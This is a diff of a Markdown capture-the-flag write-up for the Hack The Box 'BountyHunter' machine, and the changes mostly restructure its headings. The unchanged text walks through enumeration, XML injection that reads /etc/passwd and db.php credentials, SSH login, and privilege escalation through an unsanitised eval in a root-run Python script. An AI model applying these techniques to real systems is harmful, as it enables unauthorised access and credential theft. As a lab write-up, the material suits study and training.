@@ -2,8 +2,9 @@
 IP address : 10.10.11.100\
 Operating System : Linux
 
-## Enumeration
-Lets start with running a network scan on the IP address using ```NMAP``` to identify the open ports and the services running on the open ports (NOTE: This might take up quite some time)
+## Discovery
+### Nmap
+Lets first start by running a network scan on the IP address using Nmap to identify the open ports and the services running on the open ports (NOTE: This might take up quite some time)
 * sV : service detection
 * sC : Run default nmap scripts
 * A : identify the OS behind each ports
@@ -18,9 +19,11 @@ From the output of ```NMAP```, we are able to obtain the following information a
 | 22	| SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) |
 | 80	| HTTP | Apache httpd 2.4.41(Ubuntu) |
 
-## Discovery
+### Wapplyzer
 Using the ```wapplyzer``` plugin, we realise that the website uses ```php``` files.
 ![Image of wapplyzer](https://github.com/joelczk/writeups/blob/main/HTB/Images/bountyhunter_wapplyzer.PNG)
+
+### Gobuster
 
 Afterwards, we run directory enumeration on the web service of the IP address. From the output, we notice an interesting file ```db.php```
 * dir : Specifies dir/file enumeration mode
@@ -52,9 +55,10 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /portal.php           (Status: 200) [Size: 125]                                     
 /css                  (Status: 301) [Size: 310] [--> http://10.10.11.100/css/]      
 /db.php               (Status: 200) [Size: 0]                                       
-/js                   (Status: 301) [Size: 309] [--> http://10.10.11.100/js/]       
-                                    
+/js                   (Status: 301) [Size: 309] [--> http://10.10.11.100/js/]                                           
 ```
+
+### Web Resouces
 We realise that ```/js```, ```/css``` and ```/assets``` returns a status code of 301, but ```/resources``` returns a status code of 200. Visiting ```/resources```, we can see the following from the website:
 
 ![Resources page](https://github.com/joelczk/writeups/blob/main/HTB/Images/bountyhunter_resources.PNG)
@@ -92,6 +96,8 @@ with Burp. We also realise that the POST request is being sent to ```/tracker_di
 
 ![/tracker_diRbPr00f314.php request](https://github.com/joelczk/writeups/blob/main/HTB/Images/bountyhunter_tracker.PNG)
 
+## Exploit
+### XML Injection
 Looking at the ```data``` field in the request, we realize that there are URL encoded characters in the ```data``` field. Hence, we will first URL decode the payyload before we decode it with base64.
 ```code
 ┌──(kali㉿kali)-[~]
@@ -181,6 +187,8 @@ usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
   </tr>
 </table>
 ```
+
+### Attempting to SSH into server
 Unfortunately, we do not know the password of the ```development``` user to login to the SSH server
 ```code
 ┌──(kali㉿kali)-[~/Desktop]
@@ -192,6 +200,8 @@ Permission denied, please try again.
 development@10.10.11.100's password: 
 development@10.10.11.100: Permission denied (publickey,password).
 ```
+
+### Obtaining credentials
 However, we recall from ```gobuster``` that we have a ```db.php``` file, and the likely location that the file is stored in is ```var/www/html/db.php```. We can modify
 the payload to read from the ```db.php``` file
 ```code
@@ -221,7 +231,7 @@ $testuser = "test";
 ?>
 ```
 
-## Obtaining User flag
+### Obtaining User flag
 We will now SSH into the database server, using the ```development``` username that we have found earlier, and we finally successfully logged into the server via SSH. We will then be able to obtain the user flag for this challenge
 ```code
 sh development@10.10.11.100                                         5 ⚙
@@ -255,7 +265,7 @@ development@bountyhunter:~$
 development@bountyhunter:~$ cat user.txt
 ```
 
-## Obtaining System flag
+### Code Analysis of ticketValidator.py
 Next, we need to find program that have root permissions and we discovered that ```/opt/skytrain_inc/ticketValidator.py``` has root permissions
 ```code
 development@bountyhunter:~$ sudo -l
@@ -275,7 +285,7 @@ development@bountyhunter:~$ sudo vi /opt/skytrain_inc/ticketValidator.py
 [sudo] password for development: 
 Sorry, user development is not allowed to execute '/usr/bin/vi /opt/skytrain_inc/ticketValidator.py' as root on bountyhunter.
 ```
-### Code Analysis of ticketValidator.py
+
 This section of code tells us that this code only loads a file if it is a file of ```md``` format.
 ```code
 def load_file(loc):
@@ -320,7 +330,7 @@ Thirdly, the ```validationNumber``` must be evaluated to be greater than 100 to 
                 else:
                     return False
 ```
-### Exploit
+### Obtaining root flag
 We notice that the input passed to the ```eval``` function is not properly sanitized, and so we can pass in a python code command and allow it to be executed. This crafted markdown payload will be able to obtain the system flag with root privileges.
 ```code
 development@bountyhunter:~$ cat exploit.md
